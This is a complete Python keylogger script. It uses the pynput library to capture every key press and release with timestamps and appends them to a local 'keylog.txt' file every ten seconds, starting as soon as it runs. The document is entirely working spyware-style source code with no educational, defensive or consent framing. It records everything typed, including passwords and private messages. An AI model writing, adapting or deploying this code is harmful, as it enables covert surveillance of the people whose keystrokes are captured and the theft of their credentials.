
import threading
from pynput import keyboard
import datetime

class KeyLogger:
    def __init__(self, time_interval):
        self.log = "KeyLogger Started...\n"
        self.interval = time_interval

    def appendlog(self, string, is_press: bool):
        if is_press:
            self.log = self.log + f'{datetime.datetime.now()} keydown ' + string + '\n'
        else:
            self.log = self.log + f'{datetime.datetime.now()} keyup ' + string + '\n'

    def save_keypress(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = "SPACE"
            elif key == key.esc:
                current_key = "ESC"
            else:
                current_key = str(key)

        self.appendlog(current_key, True)
    
    def save_keyrelease(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = "SPACE"
            elif key == key.esc:
                current_key = "ESC"
            else:
                current_key = str(key)

        self.appendlog(current_key, False)

    def report(self):
        with open('keylog.txt', 'a') as fh:
            fh.write(self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def run(self):
        keyboard_listener = keyboard.Listener(on_press=self.save_keypress, on_release=self.save_keyrelease)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()

keylogger = KeyLogger(10)
keylogger.run()
